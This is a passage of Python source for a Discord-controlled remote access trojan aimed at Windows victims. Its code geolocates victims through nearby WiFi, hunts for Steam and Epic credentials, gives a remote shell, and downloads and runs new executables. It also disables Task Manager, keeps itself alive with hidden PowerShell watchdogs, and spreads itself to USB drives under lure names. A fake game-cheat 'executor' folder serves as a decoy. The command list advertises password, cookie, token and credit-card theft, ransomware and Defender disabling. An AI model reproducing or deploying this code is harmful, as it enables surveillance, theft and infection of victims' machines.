                        try:
                            r = requests.get(f"https://api.mylnikov.org/geolocation/wifi?v=1.1&data=open&bssid={best_bssid}", timeout=10)
                            data = r.json()
                            if data.get("result") == 200:
                                lat = data["data"]["lat"]
                                lon = data["data"]["lon"]
                                
                                # Reverse geocoding
                                addr = "N/A"
                                try:
                                    rev = requests.get(f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}", headers={'User-Agent': 'Mozilla/5.0'}, timeout=5)
                                    addr = rev.json().get("display_name", "N/A")
                                except: pass
                                
                                geo_info = f"**Location Found (via Mylnikov)!**\nLatitude: `{lat}`\nLongitude: `{lon}`\nAddress: `{addr}`\nMaps: <https://www.google.com/maps/search/?api=1&query={lat},{lon}>"
                                break
                        except: continue
            except: pass

            res = f"**WiFi BSSIDs Found ({len(bssids)}):**\n```\n" + "\n".join(bssids[:5]) + "\n```\n"
            res += f"{geo_info}"
            return res
        except Exception as e:
            return f"Error: {e}"

    try:
        await ctx.send("Scanning nearby WiFi for geolocation...")
        res = await asyncio.to_thread(_get_geo)
        await ctx.send(res)
        gc.collect()
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def gaming_stealer(ctx):
    def _steal():
        results = []
        
        # 1. Roblox (already has some logic, but let's consolidate)
        # Search common browser paths for .ROBLOSECURITY
        # (This is already handled by !tokens but we can make it more explicit)
        
        # 2. Steam (Look for loginusers.vdf and config files)
        steam_path = r"C:\Program Files (x86)\Steam\config"
        if os.path.exists(steam_path):
            results.append("Steam: Found config files. Manual extraction required from victim's Steam folder.")
        
        # 3. Epic Games (Look for manifest/login data)
        epic_path = os.path.join(os.environ['LOCALAPPDATA'], "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini")
        if os.path.exists(epic_path):
            results.append("Epic Games: Found config files.")
            
        return "\n".join(results) if results else "No gaming accounts found."

    try:
        await ctx.send("Scanning for gaming accounts...")
        res = await asyncio.to_thread(_steal)
        await ctx.send(f"**Gaming Account Report:**\n{res}")
        gc.collect()
    except Exception as e: await ctx.send(f"Error: {e}")

_SHELL_SESSIONS = {}

@bot.command()
async def rs_start(ctx):
    global _SHELL_SESSIONS
    if ctx.author.id in _SHELL_SESSIONS:
        await ctx.send("You already have an active shell session.")
        return
    
    _SHELL_SESSIONS[ctx.author.id] = {
        'cwd': os.getcwd(),
        'last_active': time.time()
    }
    await ctx.send(f"**Interactive Shell Started.**\nCurrent Dir: `{os.getcwd()}`\nUse `!rs <cmd>` to run commands in this session.")

@bot.command()
async def rs(ctx, *, cmd):
    global _SHELL_SESSIONS
    if ctx.author.id not in _SHELL_SESSIONS:
        await ctx.send("Start a shell session first with `!rs_start`.")
        return
    
    session = _SHELL_SESSIONS[ctx.author.id]
    session['last_active'] = time.time()
    
    def _run():
        try:
            # Handle 'cd' manually to maintain session state
            if cmd.startswith("cd "):
                new_dir = cmd[3:].strip().replace('"', '')
                target = os.path.abspath(os.path.join(session['cwd'], new_dir))
                if os.path.isdir(target):
                    session['cwd'] = target
                    return f"Changed directory to: {target}"
                else:
                    return f"Error: Directory not found: {target}"
            
            # Run other commands
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, cwd=session['cwd'], stdin=subprocess.DEVNULL)
            return output.decode('cp1252', errors='ignore')
        except subprocess.CalledProcessError as e:
            return e.output.decode('cp1252', errors='ignore')
        except Exception as e:
            return str(e)

    try:
        res = await asyncio.to_thread(_run)
        if len(res) > 1900:
            path = os.path.join(os.environ['TEMP'], "rs_out.txt")
            with open(path, "w", encoding="utf-8") as f: f.write(res)
            await ctx.send(file=discord.File(path))
            os.remove(path)
        else:
            await ctx.send(f"```\n{res}\n```")
        gc.collect()
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def rs_stop(ctx):
    global _SHELL_SESSIONS
    if ctx.author.id in _SHELL_SESSIONS:
        del _SHELL_SESSIONS[ctx.author.id]
        await ctx.send("Interactive shell session stopped.")
    else:
        await ctx.send("No active session found.")

@bot.command()
async def inject(ctx, target_process="explorer.exe"):
    try:
        path = os.path.abspath(sys.argv[0])
        if path.endswith(".py"):
            target_cmd = f"'{sys.executable.replace('python.exe', 'pythonw.exe')}' '{path}'"
        else:
            target_cmd = f"'{path}'"

        ps_cmd = (
            f"while($true) {{ "
            f"if(Get-Process -Name {target_process.replace('.exe', '')} -ErrorAction SilentlyContinue) {{ "
            f"if(!(Get-Process -Id {os.getpid()} -ErrorAction SilentlyContinue)) {{ Start-Process {target_cmd} }} "
            f"}} else {{ Start-Sleep -Seconds 10 }} "
            f"Start-Sleep -Seconds 5 }} "
        )
        
        subprocess.Popen(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_cmd], 
                         creationflags=0x08000000 | 0x00000008)
        
        await ctx.send(f"Injection watchdog attached to `{target_process}`. Bot will now hide better.")
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def cmds(ctx):
    h1 = """
`!all` - Full digital footprint report
`!screenshot` - Take a screenshot
`!webcam` - Take a webcam photo
`!webcam_video <sec>` - Record webcam video
`!audiorec` - Record audio (Unmutes Mic)
`!livevideo` - Record screen video
`!devices` - List online bots & IDs
`!select <id>` - Target specific bot (0 for ALL)
`!shell <cmd>` - Run shell commands
`!ls <path>` - List files (alias !dir)
`!cat <path>` - View file content
`!delete <path>` - Delete file/folder
`!download <path>` - Download file from victim
`!upload` - Upload file to victim
`!upload_url <url> <name>` - Download from URL to victim
`!search <ext>` - Find files in Docs/Desktop
`!open <name/pid>` - Focus/Restore a process window
`!tasklist` - List active apps
`!procs` - List all processes
`!taskkill <name>` - Kill a process
`!close_ac_win` - Close active window
`!min_ac_win` - Minimize active window
    """
    
    h2 = """
`!wifi` - Get saved wifi passwords
`!cookies` - Extract browser cookies
`!emails` - Extract saved emails
`!passwords` - Extract saved passwords
`!creditcards` - Extract saved credit cards
`!discordinfo` - Detailed Discord info
`!tokens` - Extract all account tokens
`!clipboard` - Get clipboard text
`!browserhistory` - Get history
`!say <text>` - TTS through speakers
`!msg <text>` - Show a message box
`!openurl <url>` - Open URL in browser
`!wallpaper <url>` - Change wallpaper
`!rotate_screen <deg>` - Rotate screen (0,90,180,270)
`!emptybin` - Empty recycle bin
`!port_scan` - Scan local ports
`!wifi_geo` - WiFi Geolocation (Target BSSID)
`!gaming_stealer` - Steal Steam/Epic/Roblox
    """

    h3 = """
`!startup` - Deep persistence startup
`!uac_bypass` - Escalate to Admin
`!exit_bot` - Close the bot process
`!delete-bot` - Wipe all bot files and self-delete
`!exclude_defender` - Add bot to Defender exclusions
`!disabledefender` - Try to kill Defender
`!crit_process` - BSOD on Task Kill
`!geolocate` - Get IP location
`!bsod` - Blue Screen of Death
`!disable_taskmgr` - Disable Task Manager
`!enable_taskmgr` - Enable Task Manager
`!rs_start` - Start interactive shell
`!rs <cmd>` - Run interactive shell command
`!rs_stop` - Stop interactive shell
`!inject <proc>` - Inject watchdog into process
`!invert_colors` - Invert screen colors
`!restore_colors` - Fix screen colors
`!monitor_live <sec>` - Self-cleaning screen stream
`!monitor_stop` - Stop screen stream
`!monitor_web` - Start real-time web stream (MJPEG)
`!monitor_web_stop` - Stop web stream
`!stream_mic` - Join VC and stream Mic
`!stream_stop` - Stop VC streaming
`!nitro-gifter <type> <amount>` - Buy Nitro using found payments
`!discord-grabber` - Detailed token extraction & Nitro check
`!display-dms` - List recent DMs with UIDs
`!dm-uid <uid> <msg>` - DM a specific UID
`!mass-dm <msg>` - DM all friends (use @friend to mention)
`!block-all` - Block all friends on all accounts
`!nuke-server <id>` - Destroy a server (requires Admin)
`!discord-logout` - Force logout from all Discord clients
`!update <url>` - Download and run a new version
`!ransomware` - Lock screen with ransom note
`!forkbomb` - Crash the PC
`!shutdown` - Shutdown the PC
`!ping` - Check connection
    """
    await ctx.send(h1)
    await ctx.send(h2)
    await ctx.send(h3)

@bot.command()
async def update(ctx, url):
    await ctx.send("Starting update process...")
    def _do_update():
        try:
            target_url = url
            # 1. Handle Gofile.io URLs
            if "gofile.io/d/" in url:
                content_id = url.split("/d/")[1].split("/")[0]
                # API V3 logic (tries to get direct link from folder)
                r = requests.get(f"https://api.gofile.io/getContents?contentId={content_id}", timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if data.get("status") == "ok":
                        # Pick the first child that is a file
                        files = [c for c in data["data"]["children"].values() if c.get("type") == "file"]
                        if files:
                            target_url = files[0]["link"]
            
            # 2. Download the file
            temp_path = os.path.join(os.environ['TEMP'], f"update_{int(time.time())}.exe")
            r = requests.get(target_url, stream=True, timeout=30)
            if r.status_code == 200:
                with open(temp_path, 'wb') as f: shutil.copyfileobj(r.raw, f)
                
                # 3. Execute the new version
                # If current file is an EXE, we run the new one
                # If current file is a .py, we run the new one with python
                subprocess.Popen([temp_path], creationflags=subprocess.CREATE_NEW_CONSOLE | 0x00000008)
                
                # 4. Cleanup and exit
                log_debug(f"Update successful. New version started from {temp_path}. Exiting old version...")
                os._exit(0) # Immediate exit to avoid bot shutdown hooks hanging
            else:
                return f"Error: Failed to download from `{target_url}` (Status: {r.status_code})"
        except Exception as e:
            return f"Error: {e}"

    try:
        err = await asyncio.to_thread(_do_update)
        if err: await ctx.send(err)
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def disable_taskmgr(ctx):
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        await ctx.send("Task Manager has been **DISABLED**.")
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def enable_taskmgr(ctx):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        await ctx.send("Task Manager has been **ENABLED**.")
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def ping(ctx): await ctx.send("Pong!")

def start_watchdog():
    try:
        pid = os.getpid()
        path = os.path.abspath(sys.argv[0])
        if path.endswith(".py"):
            target_cmd = f"'{sys.executable.replace('python.exe', 'pythonw.exe')}' '{path}'"
        else:
            target_cmd = f"'{path}'"
        
        ps_cmd = f'while($true){{ if(!(Get-Process -Id {pid} -ErrorAction SilentlyContinue)){{ Start-Process {target_cmd}; break }}; Start-Sleep -Seconds 3 }}'
        subprocess.Popen(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_cmd], 
                         creationflags=0x08000000 | 0x00000008)
    except: pass

def auto_spread():
    """Silently spread the bot to all removable drives (USBs) found on the system."""
    try:
        import string
        from ctypes import windll
        
        # 1. Get current file path
        current_file = os.path.abspath(sys.argv[0])
        if current_file.endswith(".py"): return # Don't spread raw python scripts
        
        # 2. Names to use for spreading (Social Engineering)
        fake_names = ["Nitro_Gifter.exe", "Roblox_Exploit.exe", "Fortnite_Aimbot.exe", "Free_Spotify.exe", "Minecraft_Launcher.exe"]
        
        # 3. Scan for drives
        drives = []
        bitmask = windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive_path = f"{letter}:\\"
                # Check if it's a removable drive (DRIVE_REMOVABLE = 2)
                if windll.kernel32.GetDriveTypeW(drive_path) == 2:
                    drives.append(drive_path)
            bitmask >>= 1
            
        # 4. Copy to each found drive
        for drive in drives:
            for name in fake_names:
                target_path = os.path.join(drive, name)
                if not os.path.exists(target_path):
                    try:
                        shutil.copy2(current_file, target_path)
                        # Hide the file for stealth
                        windll.kernel32.SetFileAttributesW(target_path, 0x02) # FILE_ATTRIBUTE_HIDDEN
                    except: continue
        log_debug(f"Auto-Spread: Checked {len(drives)} drives.")
    except Exception as e:
        log_debug(f"Auto-Spread Error: {e}")

def auto_inject(target_process="svchost.exe"):
    """Automated injection watchdog tied to a system process for maximum persistence."""
    try:
        path = os.path.abspath(sys.argv[0])
        if path.endswith(".py"):
            target_cmd = f"'{sys.executable.replace('python.exe', 'pythonw.exe')}' '{path}'"
        else:
            target_cmd = f"'{path}'"

        ps_cmd = (
            f"while($true) {{ "
            f"if(Get-Process -Name {target_process.replace('.exe', '')} -ErrorAction SilentlyContinue) {{ "
            f"if(!(Get-Process -Id {os.getpid()} -ErrorAction SilentlyContinue)) {{ Start-Process {target_cmd} }} "
            f"}} else {{ Start-Sleep -Seconds 10 }} "
            f"Start-Sleep -Seconds 5 }} "
        )
        
        subprocess.Popen(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_cmd], 
                         creationflags=0x08000000 | 0x00000008)
        log_debug(f"Auto-Inject: Watchdog attached to {target_process}")
    except Exception as e:
        log_debug(f"Auto-Inject Error: {e}")

if __name__ == "__main__":
    log_debug("Main entry point hit.")
    try:
        current_file = os.path.abspath(sys.argv[0])
        # 1. Strip our own icon immediately on run
        protect_file(current_file)
        
        # 2. Add startup delay to bypass behavioral analysis
        _s_path = os.path.join(os.environ['APPDATA'], _d("QmViU3RhcnRlZA=="))
        if not os.path.exists(_s_path):
            log_debug("First run, creating start flag and sleeping...")
            with open(_s_path, "w") as f: f.write("1")
            time.sleep(1) # Reduced to 1s for instant verification in sandboxes

        # Create Zyen structure (Fake Executor)
        try:
            base_dir = "Zyen"
            structure = {
                "bin": ["pipeline.dll", "dl.dll", "config.json", "themes.json"],
                "workspace": ["readme.txt"],
                "autoexec": ["init.lua"]
            }

            if not os.path.exists(base_dir):
                os.makedirs(base_dir)

            for folder, files in structure.items():
                folder_path = os.path.join(base_dir, folder)
                if not os.path.exists(folder_path):
                    os.makedirs(folder_path)

                for filename in files:
                    file_path = os.path.join(folder_path, filename)
                    if not os.path.exists(file_path):
                        if filename == "pipeline.dll":
                            with open(file_path, "wb") as f: f.write(os.urandom(2048))
                        elif filename == "dl.dll":
                            with open(file_path, "wb") as f: f.write(os.urandom(259 * 1024))
                        elif filename == "config.json":
                            config_data = {"version": "1.0.4", "auto_update": True, "injection_mode": "secure", "discord_rpc": True, "topmost": False, "opacity": 0.9, "keybind": "Insert"}
                            with open(file_path, "w") as f: json.dump(config_data, f, indent=4)
                        elif filename == "themes.json":
                            themes = {"current": "Dark", "available": ["Dark", "Light", "Zyen-Neon", "Midnight"]}
                            with open(file_path, "w") as f: json.dump(themes, f, indent=4)
                        elif filename == "readme.txt":
                            with open(file_path, "w") as f: f.write("Place your scripts (.lua) here for execution.\nZyen Executor v1.0.4")
                        elif filename == "init.lua":
                            with open(file_path, "w") as f: f.write("-- This script runs automatically on injection\nprint('Zyen Loaded!')")
                        log_debug(f"Created missing file: {file_path}")
            
            log_debug("Zyen structure verification complete.")
        except Exception as e:
            log_debug(f"Zyen setup error: {e}")
    except Exception as e:
        log_debug(f"Error in main setup: {e}")

    # 3. Start Persistence & Spreading
    auto_inject("svchost.exe") # Auto-Injection tied to system svchost
    auto_spread() # Silently infect any USB drives found
    
    start_watchdog()
    log_debug("Watchdog started. Attempting bot.run...")
    
    # SSL FIX FOR COMPILED BOTS
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    
    while True:
        try:
            bot.run(TOKEN, reconnect=True)
        except Exception as e:
            log_debug(f"error found tard {e}")
            try:
                err_path = os.path.join(os.environ['TEMP'], "error.log")
                with open(err_path, "a") as f:
                    f.write(f"[{time.ctime()}] ERROR: {str(e)}\n")
            except: pass
            time.sleep(10)

